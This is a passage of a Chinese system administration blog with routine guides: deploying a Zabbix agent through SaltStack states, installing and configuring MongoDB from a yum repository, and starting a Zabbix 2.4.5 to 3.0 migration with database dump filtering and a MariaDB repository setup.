<h3 id="五，具体安装配置"><a href="#五，具体安装配置" class="headerlink" title="五，具体安装配置"></a><strong>五，具体安装配置</strong></h3><p>Install.sls具体操作是： 1，把zabbix&#x2F;files&#x2F;zabbix.tar.gz文件发送到客户端&#x2F;tmp目录下，我这里的zabbix.tar.gz是编译好的zabbix客户端打包文件，默认解压缩后就能使用； 2，从&#x2F;tmp&#x2F;zabbix.tar.gz解压缩到&#x2F;usr&#x2F;local目录下； 3，添加zabbix用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# cat zabbix/install.sls </span><br><span class="line"></span><br><span class="line">zabbix_source:</span><br><span class="line">  file.managed:</span><br><span class="line">    - name: /tmp/zabbix.tar.gz</span><br><span class="line">    - source: salt://zabbix/files/zabbix.tar.gz</span><br><span class="line">    - user: root</span><br><span class="line">    - group: root</span><br><span class="line">    - mode: 644</span><br><span class="line">extract_zabbix:</span><br><span class="line">  cmd.run:</span><br><span class="line">    - cwd: /tmp</span><br><span class="line">    - names :</span><br><span class="line">      - tar zxvf zabbix.tar.gz -C /usr/local</span><br><span class="line">    - require:</span><br><span class="line">      - file: zabbix_source</span><br><span class="line">zabbix_user:</span><br><span class="line">  user.present:</span><br><span class="line">    - name: zabbix</span><br><span class="line">    - createhome: False</span><br><span class="line">    - gid_from_name: True</span><br><span class="line">    - shell: /sbin/nologin</span><br></pre></td></tr></table></figure>

<h3 id="六，修改配置文件开机启动"><a href="#六，修改配置文件开机启动" class="headerlink" title="六，修改配置文件开机启动"></a><strong>六，修改配置文件开机启动</strong></h3><p>1，先把配置文件下发到&#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;etc&#x2F;zabbix_agentd.conf，注意zabbix_agentd.conf有个配置Hostname&#x3D;<code>Hostname</code>，这个可以更加客户端IP不同而修改成不同的IP。 2，下发自动启动zabbix_agentd服务脚本 3，添加到开机启动列表 4，启动zabbix_agentd服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# cat zabbix/conf.sls </span><br><span class="line">zabbix_conf:</span><br><span class="line">  file.managed:</span><br><span class="line">    - name: /usr/local/zabbix/etc/zabbix_agentd.conf</span><br><span class="line">    - source: salt://zabbix/files/zabbix_agentd.conf</span><br><span class="line">    - template: jinja</span><br><span class="line">    - defaults:</span><br><span class="line">      Hostname: &#123;&#123; grains[&#x27;ip_interfaces&#x27;][&#x27;eth1&#x27;][0] &#125;&#125;</span><br><span class="line">zabbix_service:</span><br><span class="line">  file.managed:</span><br><span class="line">    - name: /etc/init.d/zabbix_agentd</span><br><span class="line">    - user: root</span><br><span class="line">    - mode: 755</span><br><span class="line">    - source: salt://zabbix/files/zabbix_agentd</span><br><span class="line">  cmd.run:</span><br><span class="line">    - names:</span><br><span class="line">      - /sbin/chkconfig --add zabbix_agentd</span><br><span class="line">      - /sbin/chkconfig zabbix_agentd on</span><br><span class="line">  service.running:</span><br><span class="line">    - name: zabbix_agentd</span><br><span class="line">    - enable: True</span><br><span class="line">    - watch:</span><br><span class="line">         - file: /usr/local/zabbix/etc/zabbix_agentd.conf</span><br></pre></td></tr></table></figure>

<h3 id="七，测试验证"><a href="#七，测试验证" class="headerlink" title="七，测试验证"></a><strong>七，测试验证</strong></h3><p>1，salt ‘<em>‘ state.highstate test&#x3D;True 这个是测试两个sls功能 2，salt-call state.highstate -l debug 这个是调试 3，salt ‘</em>‘ state.sls init.init 分别下发各个sls功能 4，具体结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">[root@saltmaster salt]# salt &#x27;*&#x27; state.sls zabbix.init</span><br><span class="line">saltmaster:</span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_source</span><br><span class="line">    Function: file.managed</span><br><span class="line">        Name: /tmp/zabbix.tar.gz</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: File /tmp/zabbix.tar.gz is in the correct state</span><br><span class="line">     Started: 15:24:20.158243</span><br><span class="line">    Duration: 12.659 ms</span><br><span class="line">     Changes:   </span><br><span class="line">----------</span><br><span class="line">          ID: extract_zabbix</span><br><span class="line">    Function: cmd.run</span><br><span class="line">        Name: tar zxvf zabbix.tar.gz -C /usr/local</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: Command &quot;tar zxvf zabbix.tar.gz -C /usr/local&quot; run</span><br><span class="line">     Started: 15:24:20.171608</span><br><span class="line">    Duration: 42.115 ms</span><br><span class="line">     Changes:   </span><br><span class="line">              ----------</span><br><span class="line">              pid:</span><br><span class="line">                  30427</span><br><span class="line">              retcode:</span><br><span class="line">                  0</span><br><span class="line">              stderr:</span><br><span class="line">              stdout:</span><br><span class="line">                  zabbix/</span><br><span class="line">                  zabbix/bin/</span><br><span class="line">                  zabbix/bin/zabbix_sender</span><br><span class="line">                  zabbix/bin/zabbix_get</span><br><span class="line">                  zabbix/lib/</span><br><span class="line">                  zabbix/sbin/</span><br><span class="line">                  zabbix/sbin/zabbix_agent</span><br><span class="line">                  zabbix/sbin/zabbix_agentd</span><br><span class="line">                  zabbix/etc/</span><br><span class="line">                  zabbix/etc/zabbix_agent.conf.d/</span><br><span class="line">                  zabbix/etc/zabbix_agent.conf</span><br><span class="line">                  zabbix/etc/zabbix_agentd.conf.d/</span><br><span class="line">                  zabbix/share/</span><br><span class="line">                  zabbix/share/man/</span><br><span class="line">                  zabbix/share/man/man1/</span><br><span class="line">                  zabbix/share/man/man1/zabbix_get.1</span><br><span class="line">                  zabbix/share/man/man1/zabbix_sender.1</span><br><span class="line">                  zabbix/share/man/man8/</span><br><span class="line">                  zabbix/share/man/man8/zabbix_agentd.8</span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_user</span><br><span class="line">    Function: user.present</span><br><span class="line">        Name: zabbix</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: User zabbix is present and up to date</span><br><span class="line">     Started: 15:24:20.215402</span><br><span class="line">    Duration: 14.994 ms</span><br><span class="line">     Changes:   </span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_conf</span><br><span class="line">    Function: file.managed</span><br><span class="line">        Name: /usr/local/zabbix/etc/zabbix_agentd.conf</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: File /usr/local/zabbix/etc/zabbix_agentd.conf is in the correct state</span><br><span class="line">     Started: 15:24:20.230479</span><br><span class="line">    Duration: 13.879 ms</span><br><span class="line">     Changes:   </span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_service</span><br><span class="line">    Function: file.managed</span><br><span class="line">        Name: /etc/init.d/zabbix_agentd</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: File /etc/init.d/zabbix_agentd is in the correct state</span><br><span class="line">     Started: 15:24:20.244543</span><br><span class="line">    Duration: 3.243 ms</span><br><span class="line">     Changes:   </span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_service</span><br><span class="line">    Function: cmd.run</span><br><span class="line">        Name: /sbin/chkconfig zabbix_agentd on</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: Command &quot;/sbin/chkconfig zabbix_agentd on&quot; run</span><br><span class="line">     Started: 15:24:20.247961</span><br><span class="line">    Duration: 17.828 ms</span><br><span class="line">     Changes:   </span><br><span class="line">              ----------</span><br><span class="line">              pid:</span><br><span class="line">                  30429</span><br><span class="line">              retcode:</span><br><span class="line">                  0</span><br><span class="line">              stderr:</span><br><span class="line">              stdout:</span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_service</span><br><span class="line">    Function: cmd.run</span><br><span class="line">        Name: /sbin/chkconfig --add zabbix_agentd</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: Command &quot;/sbin/chkconfig --add zabbix_agentd&quot; run</span><br><span class="line">     Started: 15:24:20.266112</span><br><span class="line">    Duration: 25.019 ms</span><br><span class="line">     Changes:   </span><br><span class="line">              ----------</span><br><span class="line">              pid:</span><br><span class="line">                  30430</span><br><span class="line">              retcode:</span><br><span class="line">                  0</span><br><span class="line">              stderr:</span><br><span class="line">              stdout:</span><br><span class="line">----------</span><br><span class="line">          ID: zabbix_service</span><br><span class="line">    Function: service.running</span><br><span class="line">        Name: zabbix_agentd</span><br><span class="line">      Result: True</span><br><span class="line">     Comment: Service zabbix_agentd is already enabled, and is in the desired state</span><br><span class="line">     Started: 15:24:20.296152</span><br><span class="line">    Duration: 113.405 ms</span><br><span class="line">     Changes:   </span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">------------</span><br><span class="line">Succeeded: 8 (changed=3)</span><br><span class="line">Failed:    0</span><br><span class="line">------------</span><br><span class="line">Total states run:     8</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/18/2018/12/2018-12-18-yum-%E6%BA%90%E5%AE%89%E8%A3%85mongodb/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/18/2018/12/2018-12-18-yum-%E6%BA%90%E5%AE%89%E8%A3%85mongodb/index/" class="post-title-link" itemprop="url">YUM 源安装MongoDB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-18 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-18T08:00:00+08:00">2018-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="MongoDB-v2-6-0版的软件仓库一共有五个包："><a href="#MongoDB-v2-6-0版的软件仓库一共有五个包：" class="headerlink" title="MongoDB v2.6.0版的软件仓库一共有五个包："></a>MongoDB v2.6.0版的软件仓库一共有五个包：</h5><p>1）mongodb-org 此包是元数据包，它可以实现自动安装下面的4个组件包。 2）mongodb-org-server 此包里面有mongod守护程序，以及相关的配置和初始化脚本。 3）mongodb-org-mongos 此包里面有mongos守护程序。 4）mongodb-org-shell 此包里面有mongo shell环境。 5）mongodb-org-tools 此包里面有以下的MongoDB工具：mongoimport、bsondump、mongodump、mongoexport、mongofiles、mongoimport、mongooplog、mongoperf、mongorestore、mongostat以及mongotop。</p>
<h5 id="1，创建mongodb-repo文件"><a href="#1，创建mongodb-repo文件" class="headerlink" title="1，创建mongodb.repo文件"></a>1，创建mongodb.repo文件</h5><p>在&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下创建文件mongodb.repo，它包含MongoDB仓库的配置信息，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mongodb]  </span><br><span class="line">name=MongoDB Repository  </span><br><span class="line">baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64/  </span><br><span class="line">gpgcheck=0  </span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<h5 id="2，执行安装命令"><a href="#2，执行安装命令" class="headerlink" title="2，执行安装命令"></a>2，执行安装命令</h5><p>yum -y install mongodb-org Loaded plugins: fastestmirror, security Loading mirror speeds from cached hostfile * base: mirrors.yun-idc.com * epel: mirrors.yun-idc.com * extras: mirrors.yun-idc.com * updates: mirrors.yun-idc.com Setting up Install Process Package mongodb-org-2.6.3-1.x86_64 already installed and latest version Nothing to do rpm -qa |grep mongodb mongodb-org-2.6.3-1.x86_64 mongodb-org-mongos-2.6.3-1.x86_64 mongodb-org-shell-2.6.3-1.x86_64 mongodb-org-server-2.6.3-1.x86_64 mongodb-org-tools-2.6.3-1.x86_64</p>
<h5 id="3，自定义db和log存放路径"><a href="#3，自定义db和log存放路径" class="headerlink" title="3，自定义db和log存放路径"></a>3，自定义db和log存放路径</h5><p>新建存放DB目录 mkdir -p &#x2F;data&#x2F;mongodb&#x2F;log 设置属主和属组，安装mongodb后会新建一个账号mongodb chown -R mongod:mongod &#x2F;data&#x2F;mongodb egrep ‘dbpath|logpath’ &#x2F;etc&#x2F;mongod.conf logpath&#x3D;&#x2F;data&#x2F;mongodb&#x2F;log&#x2F;mongod.log dbpath&#x3D;&#x2F;data&#x2F;mongodb</p>
<h5 id="4，设置日志大小，并发连接数"><a href="#4，设置日志大小，并发连接数" class="headerlink" title="4，设置日志大小，并发连接数"></a>4，设置日志大小，并发连接数</h5><p>oplogSize&#x3D;4096 maxConns&#x3D;3280 总配置文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep -Ev &#x27;^#|^$&#x27; /etc/mongod.conf</span><br><span class="line">logpath=/data/mongodb/log/mongod.log</span><br><span class="line">logappend=true</span><br><span class="line">fork=true</span><br><span class="line">port=27017</span><br><span class="line">dbpath=/data/mongodb</span><br><span class="line">pidfilepath=/var/run/mongodb/mongod.pid</span><br><span class="line">oplogSize=4096</span><br><span class="line">maxConns=3280</span><br><span class="line">directoryperdb=true</span><br><span class="line">nojournal=true</span><br><span class="line">replSet=rpls</span><br></pre></td></tr></table></figure>

<p>启动mongod service mongod restart Stopping mongod: [ OK ] Starting mongod: [ OK ] 查看文件 ls &#x2F;data&#x2F;mongodb&#x2F; journal local.0 local.ns mongod.lock _tmp 查看端口是否开启 ss -anp |grep mongod LISTEN 0 128 127.0.0.1:27017 *:* users:((“mongod”,9295,9))</p>
<h5 id="5，设置开机自动启动mongodb"><a href="#5，设置开机自动启动mongodb" class="headerlink" title="5，设置开机自动启动mongodb"></a>5，设置开机自动启动mongodb</h5><p>chkconfig mongod on</p>
<h5 id="6，Mongodb启动命令mongod参数说明"><a href="#6，Mongodb启动命令mongod参数说明" class="headerlink" title="6，Mongodb启动命令mongod参数说明"></a>6，Mongodb启动命令mongod参数说明</h5><p>mongod的主要参数有：</p>
<p>基本配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--quiet     # 安静输出</span><br><span class="line">--port arg     # 指定服务端口号，默认端口27017</span><br><span class="line">--bind_ip arg     # 绑定服务IP，若绑定127.0.0.1，则只能本机访问，不指定默认本地所有IP</span><br><span class="line">--logpath arg     # 指定MongoDB日志文件，注意是指定文件不是目录</span><br><span class="line">--logappend     # 使用追加的方式写日志</span><br><span class="line">--pidfilepath arg     # PID File 的完整路径，如果没有设置，则没有PID文件</span><br><span class="line">--keyFile arg     # 集群的私钥的完整路径，只对于Replica Set 架构有效</span><br><span class="line">--unixSocketPrefix arg     # UNIX域套接字替代目录,(默认为 /tmp)</span><br><span class="line">--fork     # 以守护进程的方式运行MongoDB，创建服务器进程</span><br><span class="line">--auth     # 启用验证</span><br><span class="line">--cpu     # 定期显示CPU的CPU利用率和iowait</span><br><span class="line">--dbpath arg     # 指定数据库路径</span><br><span class="line">--diaglog arg     # diaglog选项 0=off 1=W 2=R 3=both 7=W+some reads</span><br><span class="line">--directoryperdb     # 设置每个数据库将被保存在一个单独的目录</span><br><span class="line">--journal     # 启用日志选项，MongoDB的数据操作将会写入到journal文件夹的文件里</span><br><span class="line">--journalOptions arg     # 启用日志诊断选项</span><br><span class="line">--ipv6     # 启用IPv6选项</span><br><span class="line">--jsonp     # 允许JSONP形式通过HTTP访问（有安全影响）</span><br><span class="line">--maxConns arg     # 最大同时连接数 默认2000</span><br><span class="line">--noauth     # 不启用验证</span><br><span class="line">--nohttpinterface     # 关闭http接口，默认关闭27018端口访问</span><br><span class="line">--noprealloc     # 禁用数据文件预分配(往往影响性能)</span><br><span class="line">--noscripting     # 禁用脚本引擎</span><br><span class="line">--notablescan     # 不允许表扫描</span><br><span class="line">--nounixsocket     # 禁用Unix套接字监听</span><br><span class="line">--nssize arg (=16)     # 设置信数据库.ns文件大小(MB)</span><br><span class="line">--objcheck     # 在收到客户数据,检查的有效性，</span><br><span class="line">--profile arg     # 档案参数 0=off 1=slow, 2=all</span><br><span class="line">--quota     # 限制每个数据库的文件数，设置默认为8</span><br><span class="line">--quotaFiles arg     # number of files allower per db, requires --quota</span><br><span class="line">--rest     # 开启简单的rest API</span><br><span class="line">--repair     # 修复所有数据库run repair on all dbs</span><br><span class="line">--repairpath arg     # 修复库生成的文件的目录,默认为目录名称dbpath</span><br><span class="line">--slowms arg (=100)     # value of slow for profile and console log</span><br><span class="line">--smallfiles     # 使用较小的默认文件</span><br><span class="line">--syncdelay arg (=60)     # 数据写入磁盘的时间秒数(0=never,不推荐)</span><br><span class="line">--sysinfo     # 打印一些诊断系统信息</span><br><span class="line">--upgrade     # 如果需要升级数据库</span><br><span class="line"> * Replicaton 参数</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--fastsync     # 从一个dbpath里启用从库复制服务，该dbpath的数据库是主库的快照，可用于快速启用同步</span><br><span class="line">--autoresync     # 如果从库与主库同步数据差得多，自动重新同步，</span><br><span class="line">--oplogSize arg     # 设置oplog的大小(MB)</span><br><span class="line"> * 主/从参数</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--master     # 主库模式</span><br><span class="line">--slave     # 从库模式</span><br><span class="line">--source arg     # 从库 端口号</span><br><span class="line">--only arg     # 指定单一的数据库复制</span><br><span class="line">--slavedelay arg     # 设置从库同步主库的延迟时间</span><br><span class="line"> * Replica set(副本集)选项：</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--replSet arg     # 设置副本集名称</span><br><span class="line"> * Sharding(分片)选项</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">--configsvr     # 声明这是一个集群的config服务,默认端口27019，默认目录/data/configdb</span><br><span class="line">--shardsvr     # 声明这是一个集群的分片,默认端口27018</span><br><span class="line">--noMoveParanoia     # 关闭偏执为moveChunk数据保存</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/18/2018/12/2018-12-18-zabbix2-4-5%E8%BF%81%E7%A7%BB%E5%88%B0zabbix3-0/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/18/2018/12/2018-12-18-zabbix2-4-5%E8%BF%81%E7%A7%BB%E5%88%B0zabbix3-0/index/" class="post-title-link" itemprop="url">zabbix2.4.5迁移到zabbix3.0</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-18 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-18T08:00:00+08:00">2018-12-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a><strong>参考文档</strong></h3><p><a target="_blank" rel="noopener" href="http://qicheng0211.blog.51cto.com/3958621/1744603">http://qicheng0211.blog.51cto.com/3958621/1744603</a></p>
<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a><strong>起因</strong></h3><p>zabbix 2.4.5数据库mysql突然死掉了，查找mysql数据库日志发现保存数据磁盘读写错误，原来那是台r410的老机，后来索性换了1台R610的稍微好的机子，现在机器都换了打算zabbix版本也一块儿换掉，开启zabbix3.0模式，下面是主要步骤，数据库这块儿是这次才发现有个简单方法的。</p>
<h5 id="0，首先要有原来数据库备份"><a href="#0，首先要有原来数据库备份" class="headerlink" title="0，首先要有原来数据库备份"></a>0，首先要有原来数据库备份</h5><p>硬件服务器也升级了 ，只有最近一份数据库全部备份，发现数据太大，如果全部导入费时，查找各种资料发现没有导入时忽略某些表的方法，后来想到手动对sql数据表进行过滤。</p>
<p>grep -v ‘INSERT INTO <code>history_uint</code> VALUES’ zabbix.sql &gt;zabbix.nohistory.sql grep -v ‘INSERT INTO <code>history</code> VALUES’ zabbix.nohistory.sql &gt;zabbix.nohistory0.sql</p>
<p>如果想导入历史趋势，后面两步可以不需要，我的需要保留 grep -v ‘INSERT INTO <code>trends_uint</code> VALUES’ zabbix.nohistory0.sql &gt; zabbix.nohistory1.sql grep -v ‘INSERT INTO <code>trends</code> VALUES’ zabbix.nohistory1.sql &gt; zabbix.nohistory2.sql</p>
<p>后来我修改了备份方法，由原来的全部备份到备份时忽略历史数据。 mysqldump -uroot -p’pasword’ zabbix –ignore-table&#x3D;zabbix.history_uint –ignore-table&#x3D;zabbix.history &gt;zabbix.nohistory.sql</p>
<h5 id="1，LAMP或者LNMP环境"><a href="#1，LAMP或者LNMP环境" class="headerlink" title="1，LAMP或者LNMP环境"></a>1，LAMP或者LNMP环境</h5><p>网上方法很多，就是一点，mysql使用innodb引擎 ，版本5.6或以上，php版本5.6或以上，apache或者nginx根据个人爱好。我的都是用rpm包，数据用的mariadb。</p>
<p>mariadb源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/yum.repos.d/mariadb.repo </span><br><span class="line"># http://mariadb.org/mariadb/repositories/  </span><br><span class="line">[mariadb]  </span><br><span class="line">name = MariaDB  </span><br><span class="line">baseurl = http://yum.mariadb.org/5.5/centos6-amd64  </span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB  </span><br><span class="line">gpgcheck=1  </span><br></pre></td></tr></table></figure>

<p>安装 yum -y install MariaDB-client MariaDB-server MariaDB-devel</p>
